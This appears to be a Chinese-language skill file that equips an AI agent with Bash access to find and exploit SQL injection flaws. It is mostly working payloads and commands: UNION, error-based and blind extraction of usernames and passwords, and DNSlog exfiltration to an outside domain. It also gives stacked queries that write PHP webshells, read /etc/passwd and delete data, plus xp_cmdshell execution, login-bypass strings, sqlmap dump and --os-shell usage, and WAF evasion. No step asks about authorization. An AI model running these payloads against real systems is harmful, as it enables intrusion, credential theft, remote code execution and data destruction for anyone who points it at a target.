---
name: sqli
description: SQL 注入漏洞检测与利用。当目标存在数据库查询、搜索功能、登录表单、URL 参数时使用。包括 UNION、报错、盲注等技术。
allowed-tools: Bash, Read, Write
---

# SQL 注入 (SQL Injection)

通过在用户输入中注入 SQL 代码，操纵数据库查询，实现数据泄露、认证绕过或命令执行。

## 决策策略

### 三层推理
- **fact**: 直接观察到的行为（响应内容、错误信息、SQL报错）
- **hypothesis**: 猜测（未经证实）
- **decision**: 下一步行动

### 最短探针原则
先确认假设，再深入攻击。SQLi 最短探针顺序：
1. `id=1'` → 确认是否有SQL报错
2. `id=1 AND 1=1` vs `id=1 AND 1=2` → 确认逻辑差异
3. 再尝试 UNION 或盲注

### 切换规则
探针无差异时：
- 尝试不同报错方式（单引号、双引号、注释）
- 尝试时间盲注（sleep/BENCHMARK）
- 尝试不同参数（POST/JSON/Cookie）
- 换用 sqlmap 自动检测

## 常见指示器

- URL 参数（id=, page=, search=, sort=, order=）
- 搜索框、登录表单
- Cookie 中的参数
- HTTP 头（User-Agent, Referer, X-Forwarded-For）
- JSON/XML 请求体中的参数
- 数字型或字符串型参数

## 检测方法

### 1. 基础测试

```bash
# 单引号测试
curl "http://target.com/page?id=1'"

# 双引号测试
curl "http://target.com/page?id=1\""

# 注释测试
curl "http://target.com/page?id=1--"
curl "http://target.com/page?id=1#"

# 逻辑测试
curl "http://target.com/page?id=1 AND 1=1"
curl "http://target.com/page?id=1 AND 1=2"
```

### 2. 时间盲注测试

```bash
# MySQL
curl "http://target.com/page?id=1 AND SLEEP(5)"

# PostgreSQL
curl "http://target.com/page?id=1; SELECT pg_sleep(5)"

# MSSQL
curl "http://target.com/page?id=1; WAITFOR DELAY '0:0:5'"
```

## 攻击向量

### UNION 注入

```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- 快速探测字段数上限
1" order by 100--+  // 出现错误即达临界值

-- 确定显示位（用-1让原始查询无结果）
-1" union select 1,2,3--+

-- 提取数据
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,column_name,3 FROM information_schema.columns--

-- MySQL 信息收集
' UNION SELECT @@version,user(),database()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--

-- 数据枚举（带分隔符）
-1" union select 1,group_concat(col1,0x3a,col2),3 from dbName.tableName--+
// 0x3a为冒号分隔符

-- 宽字节注入（GBK编码场景）
1%df' union select 1,database(),3--+
// %df与'拼接逃逸单引号过滤

-- 表名用16进制编码绕过字符串过滤
1' union/**/select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x64767761--+
// 0x64767761=dvwa

-- 用NULL填充不确定字段类型的列
1" union select NULL,NULL,concat(col1,0x20,col2) from dbName.tableName--+

-- 大小写混合绕过union/select关键字过滤
1' UNIOn SEleCT 1,current_user(),3--+
```

### 报错注入

```sql
-- MySQL extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
' AND extractvalue(1,concat(0x3a,(select database())))--+  // 报错泄露当前库名
' AND extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema like 'dbName')))--+  // 枚举表名
' AND extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name like 'tableName')))--+  // 枚举列名
' AND extractvalue(1,concat(0x7e,(select left(colName,30) from dbName.tableName)))--+  // 读取字段前30位
' AND extractvalue(1,concat(0x7e,(select right(colName,30) from dbName.tableName)))--+  // 读取字段后30位

-- MySQL updatexml
' AND updatexml(1,concat(0x7e,database(),0x7e),1)--  // 报错泄露数据库名
' AND updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='dbName' limit 1,1),0x7e),1)--  // 读取第2个表名
' AND updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='dbName' and table_name='tableName' limit 1,1),0x7e),1)--  // 读取第2个列名
' AND updatexml(1,concat(0x7e,(select concat(uname,0x3a,pwd) from users limit 1,1),0x7e),1)--  // 读取第2条用户数据

-- MySQL floor函数报错
' AND (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.columns group by x)tmp)--  // 利用group by重复值报错

-- MySQL BigInt溢出报错
' AND exp(~(select * from (select current_user())tmp))--  // 泄露当前用户
' AND exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 2,1)tmp))--  // 读取第3个表名
' AND exp(~(select * from (select column_name from information_schema.columns where table_name='tableName' limit 2,1)tmp))--  // 读取第3个列名

-- MySQL 特殊函数报错
' AND name_const((select database()),1)--+  // 利用name_const函数重复命名报错
' AND geometrycollection((select * from (select database())a))--+  // 空间函数报错
' AND multipoint((select concat(table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1))--+  // 空间函数泄露表名
' AND polygon((select concat(column_name,0x7e) from information_schema.columns where table_name='users' limit 0,1))--+  // 空间函数泄露列名
' AND linestring((select concat(uname,0x3a,pwd) from users limit 0,1))--+  // 空间函数泄露数据
' AND multilinestring((select version()))--+  // 空间函数泄露版本

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--

-- MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
```

### 布尔盲注

```sql
-- 判断条件
' AND 1=1--  (正常)
' AND 1=2--  (异常)

-- 逐字符提取
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--

-- 二分法
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--

-- 数据库信息探测
' AND LENGTH((SELECT database())) = 8--  // 探测当前数据库名称长度
' AND ASCII(SUBSTR((SELECT database()),1,1)) > 95--  // 探测库名第1个字符ASCII值

-- 表信息探测
' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database()) = 8--  // 判断表数量
' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)) = 12--  // 探测第1个表名长度
' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),3,1)) < 110--  // 探测表名第3个字符

-- 列信息探测
' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users') = 5--  // 判断列数
' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1)) = 117--  // 探测列名首字符

-- 字段数据探测
' AND LENGTH(SUBSTR((SELECT uname FROM users LIMIT 0,1),1)) = 6--  // 探测用户名长度
' AND ASCII(SUBSTR((SELECT uname FROM users LIMIT 0,1),2,1)) = 109--  // 探测用户名第2个字符

-- 新函数技巧
' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) REGEXP '^u'--  // 用regexp判断前缀
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1) LIKE 'pa%'--  // 用like模糊匹配
' AND BIT_LENGTH(database())=32--  // 用bit_length判断字节数
```

### 时间盲注

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- MySQL 进阶
' AND IF(LENGTH(database())=8,SLEEP(3),1)--  // 库名长度为8则延迟
' AND IF(ASCII(SUBSTR(database(),1,1))=116,SLEEP(3),1)--  // 库名首字符为't'则延迟
' AND IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=5,SLEEP(3),1)--  // 表数量为5则延迟
' AND (SELECT ASCII(SUBSTR(table_name,2,1)) FROM information_schema.tables WHERE table_schema='test' LIMIT 0,1) = 101 AND SLEEP(3)--  // 表名第2个字符为'e'则延迟
' AND IF((SELECT ASCII(SUBSTR(column_name,1,1)) FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)=117,SLEEP(3),1)--  // 列名首字符为'u'则延迟

-- 跨数据库时间盲注
'; WAITFOR DELAY '0:0:5'--  // SQL Server专属
' AND pg_sleep(5)--+  // PostgreSQL专属
' AND IF((SELECT uname FROM users LIMIT 0,1)='admin',SLEEP(5),0)--  // 多条件嵌套

-- BENCHMARK替代SLEEP
'; IF((SELECT ASCII(SUBSTR((SELECT pwd FROM users WHERE uname='admin'),1,1))) = 104, BENCHMARK(8000000, MD5('x')), NULL)--
'; IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='test' AND table_name='users'), BENCHMARK(6000000, SHA1('x')), NULL)--
```

### DNSlog 盲注（无回显场景）

```sql
-- 需提前准备 DNSlog 域名（如 xxx.dnslog.cn）

-- MySQL DNSlog泄露库名（Windows环境）
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\a'))--+

-- 16进制编码避免特殊字符干扰
' AND (SELECT LOAD_FILE(CONCAT('\\\\',HEX((SELECT table_name FROM information_schema.tables LIMIT 0,1)),'.xxx.dnslog.cn\\b')))--

-- SQL Server DNSlog泄露库名
'; EXEC master..xp_dirtree '\\\\(SELECT db_name()).xxx.dnslog.cn\\c';--

-- PostgreSQL DNSlog
' AND (SELECT pg_read_file(CONCAT('\\\\',(SELECT current_database()),'.xxx.dnslog.cn\\d')))--
```

### 堆叠查询

```sql
-- MySQL (需要 mysqli_multi_query)
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- 基础信息查询
1"; show databases;--  // 枚举所有数据库实例
1"; show tables from dbName;--  // 指定数据库查表名
1"; show columns from tableName;--  // 查看表结构（表名含特殊字符时需反引号）

-- 表结构操作（表名替换与列名修改）
1"; RENAME TABLE t1 TO t2; RENAME TABLE t3 TO t1; ALTER TABLE t1 CHANGE c1 c2 VARCHAR(200); show columns from t1;--

-- HANDLER语句读取数据（SELECT被禁时使用）
1"; HANDLER tableName OPEN; HANDLER tableName READ FIRST; HANDLER tableName READ NEXT; HANDLER tableName CLOSE;--
1"; HANDLER `1919810931114514` OPEN; HANDLER `1919810931114514` READ FIRST;--+  // 数字表名需反引号

-- 文件操作
1"; SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php';--+  // MySQL写webshell（需secure_file_priv未限制）
1"; LOAD_FILE('/etc/passwd');--+  // MySQL读取系统文件（需权限允许）
'; COPY (SELECT '<?php phpinfo();?>') TO '/var/www/shell.php';--+  // PostgreSQL写文件

-- 数据/结构修改
1"; INSERT INTO users(uname,pwd) VALUES('hacker','123456');--+  // 堆叠插入管理员账号
1"; DELETE FROM users WHERE uname='admin';--+  // 堆叠删除指定数据（高危）
1"; CREATE TABLE hack_table(id int,cmd varchar(100));--+  // 堆叠创建恶意表

-- MSSQL
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--

-- PostgreSQL
'; CREATE TABLE test(data text); COPY test FROM '/etc/passwd'--
```

### 认证绕过

```sql
-- 登录绕过
admin'--
admin'#
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
admin' OR '1'='1
' OR ''='
') OR ('1'='1
') OR ('1'='1'--

-- 密码字段绕过
' OR '1'='1
anything' OR '1'='1'--
```

## sqlmap 使用

### 基础用法

```bash
# 自动检测
sqlmap -u "http://target.com/page?id=1" --batch

# 指定参数
sqlmap -u "http://target.com/page?id=1" -p id --batch

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Cookie 注入
sqlmap -u "http://target.com/page" --cookie="id=1" -p id --batch
```

### 数据提取

```bash
# 列出数据库
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# 列出表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch

# 列出列
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns --batch

# 导出数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump --batch
```

### 高级选项

```bash
# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --batch

# 指定注入技术
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
sqlmap -u "http://target.com/page?id=1" --technique=BEUST --batch

# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch

# 提权
sqlmap -u "http://target.com/page?id=1" --os-shell --batch
sqlmap -u "http://target.com/page?id=1" --sql-shell --batch
```

## 绕过技术

### 空格绕过

```sql
-- 注释替代
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- Tab
SELECT%0ausername%0aFROM%0ausers  -- 换行

-- 括号
SELECT(username)FROM(users)
```

### 引号绕过

```sql
-- 十六进制
SELECT * FROM users WHERE username=0x61646d696e  -- 'admin'

-- CHAR 函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

### 关键字绕过

```sql
-- 大小写混合
SeLeCt, UnIoN, FrOm

-- 双写
SELSELECTECT, UNUNIONION

-- 编码
%53%45%4c%45%43%54  -- SELECT

-- 注释分割
SEL/**/ECT, UN/**/ION
```

### WAF 绕过 Tamper 脚本

```bash
# 常用 tamper
--tamper=space2comment      # 空格转注释
--tamper=between            # 使用 BETWEEN 替代 >
--tamper=randomcase         # 随机大小写
--tamper=charencode         # URL 编码
--tamper=equaltolike        # = 转 LIKE
--tamper=space2plus         # 空格转 +
--tamper=space2randomblank  # 空格转随机空白字符
```

## 数据库特定语法

### MySQL

```sql
-- 版本
SELECT @@version
SELECT version()

-- 当前用户
SELECT user()
SELECT current_user()

-- 当前数据库
SELECT database()

-- 所有数据库
SELECT schema_name FROM information_schema.schemata

-- 所有表
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- 所有列
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 读文件
SELECT LOAD_FILE('/etc/passwd')

-- 写文件
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
```

### PostgreSQL

```sql
-- 版本
SELECT version()

-- 当前用户
SELECT current_user

-- 当前数据库
SELECT current_database()

-- 所有数据库
SELECT datname FROM pg_database

-- 所有表
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- 读文件
CREATE TABLE test(data text); COPY test FROM '/etc/passwd'; SELECT * FROM test;

-- 命令执行
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');
```

### MSSQL

```sql
-- 版本
SELECT @@version

-- 当前用户
SELECT user_name()
SELECT system_user

-- 当前数据库
SELECT db_name()

-- 所有数据库
SELECT name FROM master..sysdatabases

-- 所有表
SELECT name FROM sysobjects WHERE xtype='U'

-- 命令执行
EXEC xp_cmdshell 'whoami'
```

## 最佳实践

1. 先用单引号测试是否存在注入点
2. 确定数据库类型（通过报错信息或特定函数）
3. 确定注入类型（UNION、报错、盲注）
4. 使用 sqlmap 自动化利用
5. 如果 sqlmap 失败，手工构造 payload
6. 注意 WAF 绕过，使用 tamper 脚本
7. 提取敏感数据后尝试提权（os-shell）

## 特殊场景注入

### 二次注入（注册-登录触发）

```sql
-- 注册用户名：admin'#
-- 登录时触发：1' AND uname='admin'#--+
-- 注册时注入恶意字符，登录时拼接执行
```

### 过滤绕过注入（空格/关键字被禁）

```sql
-- 用%0a（换行符）替代空格
1'%0aand%0a(ascii(substr(database(),1,1)))=100%0a#

-- 用子查询包裹sleep绕过函数过滤
1'and(select*from(select sleep(5))a)#

-- 嵌套子查询绕过括号过滤
1'and(select count(*)from information_schema.tables where table_schema=database()and table_name regexp '^u')>0#
```

### 无列名注入（information_schema被禁）

```sql
-- 利用表自连接获取无列名数据
1' UNION SELECT 1,(SELECT * FROM (SELECT * FROM users AS a JOIN users AS b ON a.id=b.id)c LIMIT 0,1),3--+
```

### 宽字节/编码绕过注入

```sql
-- UTF-8宽字节注入（%e5与'拼接逃逸）
1%e5' UNION SELECT 1,version(),3--+

-- 用unhex解码16进制字符串（6461746162617365=database）
1' AND unhex('6461746162617365')=database()#

-- base64解码绕过字符串过滤（ZGF0YWJhc2U=database）
1' UNION SELECT 1,from_base64('ZGF0YWJhc2U='),3--+

-- 用char()函数构造字符（100='d'）
1" AND char(100)=substr(database(),1,1)--+

-- 用concat_ws拼接字段判断数据存在性
1' AND concat_ws(',',col1,col2) regexp 'admin'#
```

### 权限/配置探测注入

```sql
-- 判断当前用户是否为超级管理员
1' AND (SELECT super_priv FROM mysql.user WHERE user=current_user())='Y'#

-- 查询MySQL数据存储目录
1' UNION SELECT 1,@@datadir,3--+

-- 查询MySQL文件读写限制（为空则允许任意路径）
1' UNION SELECT 1,@@secure_file_priv,3--+

-- 查询数据库服务器操作系统
'; SELECT @@version_compile_os;--

-- 判断数据库用户数量
1' AND (SELECT COUNT(*) FROM mysql.user)>=5#
```

### PostgreSQL 专属注入

```sql
-- PostgreSQL获取当前库名（替代database()）
1' UNION SELECT 1,(SELECT current_database()),3--+

-- PostgreSQL查询系统表pg_tables（替代information_schema）
1' AND (SELECT 1 FROM pg_tables WHERE tablename LIKE 'user%')--+
```

---

## 来自外部导入内容 (CTF Web - server-side.md SQLi 部分)

### 反斜杠转义引号绕过

```bash
# 查询: SELECT * FROM users WHERE username='$user' AND password='$pass'
# 用户名=\ : WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

### 十六进制编码绕过引号

```sql
SELECT 0x6d656f77;  -- 返回 'meow'
```

### 二次SQL注入

注册时注入SQL，在个人资料查看时触发。

### MySQL 列截断 (VolgaCTF 2014)

```bash
# VARCHAR(20) 列 — 填充 "admin" (5字符) 超过列宽
curl -X POST http://target/register -d \
  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'
```

### SQLi 到 SSTI 链

当 SQLi 结果在模板中渲染时:
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
```

### WAF 绕过通过 XML 实体编码 (Crypto-Cat)

```xml
<storeId>
  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
</storeId>
```

### SQLi 通过 EXIF 元数据注入 (29c3 CTF 2012)

```bash
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg
```

### Shift-JIS 编码 SQL 注入 (Boston Key Party 2016)

```javascript
socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
```

### SQL 注入通过 QR 码输入 (H4ckIT CTF 2016)

```python
import qrcode
payload = "'\tunion\tselect\tsecret_field\tfrom\tmessages\twhere\tsecret_field\tlike\t'%flag%"
img = qrcode.make(payload)
```

### SQL 双关键字过滤器绕过 (DefCamp CTF 2016)

```text
), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #
```
